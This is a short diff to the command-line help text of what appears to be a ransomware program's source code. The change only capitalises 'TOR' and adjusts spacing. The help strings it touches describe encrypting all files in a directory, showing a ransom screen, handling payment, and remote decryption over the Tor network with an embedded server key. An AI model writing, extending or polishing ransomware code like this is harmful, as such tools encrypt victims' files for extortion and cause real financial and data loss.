@@ -198,7 +198,7 @@ void ArgumentParser::showUsage() const
                         + "\t-d,   --dir         Directory path to start the cryptographic ransomware (Encryption+Visualization+Payment+Decryption)\n"
                         + "\t-enc, --encrypt\t    Encrypts all files in provided directory path and shows the ransom visualization\n"
                         + "\t-dec, --decrypt\t    Decrypts all files in provided directory path, if the request to the remote server was successful\n"
-                        + "\t-t,   --tor\t        Remote decryption over the tor network\n"
+                        + "\t-t,   --tor\t    Remote decryption over the TOR network\n"
                         + "\t-k,   --key         Masterkey for the decryption, if the remote server is not used (Corresponds to the embedded server public key)\n"
                         + "\t-p,   --protected   Saves all key files to the system (For manual decryption)\n"
                         + "\t-c,   --config\t    Logger config path\n"
